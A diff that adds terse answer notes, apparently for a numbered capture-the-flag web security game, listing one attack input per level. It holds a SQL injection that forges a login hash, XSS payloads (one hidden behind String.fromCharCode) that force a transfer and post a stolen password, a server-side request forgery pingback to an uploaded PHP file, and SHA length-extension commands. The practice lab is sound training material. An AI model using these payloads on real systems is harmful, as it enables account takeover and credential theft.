@@ -1,0 +1,36 @@
+level0
+%
+
+level1
+&filename=
+
+level2
+upload a.php
+
+level3
+' UNION select '1', '961b6dd3ede3cb8ecbaacbd68de040cd78eb2ed5889130cceb4c49268ea4d506', 'a' ORDER BY salt; --
+
+level4
+<script>$.post('/transfer', {to: "b", amount: 100}, function(data){});</script>
+karma_fountain
+dummy-password
+
+level5
+http://localhost:4567?pingback=http://localhost/level02-code/uploads/b.php
+
+level6 (new line is important)
+level07-password-holder
+dum'my"pas`sword
+
+\b</script>
+<script>$.get(String.fromCharCode(117, 115, 101, 114, 95, 105, 110, 102, 111), function(data) {  var td = data.split(String.fromCharCode(60, 116, 100, 62)); var td2 = td[2].split(String.fromCharCode(60, 47, 116, 100, 62)); $(String.fromCharCode(35, 99, 111, 110, 116, 101, 110, 116)).html(btoa(td2[0])); $(String.fromCharCode(35, 110, 101, 119, 95, 112, 111, 115, 116)).submit(); }); </script><script>var username = String.fromCharCode(108, 101, 118, 101, 108, 48, 55, 45, 112, 97, 115, 115, 119, 111, 114, 100, 45, 104, 111, 108, 100, 101, 114);
+//
+
+level7
+python sha-padding.py 14 "" 8e17b6cf861a4077e856789a9f3b42b5bf9f80bc ""
+paste in new stuff
+python final-client.py
+
+level8
+./password_db_launcher 123222010111 127.0.0.1:30000
+python hack.py
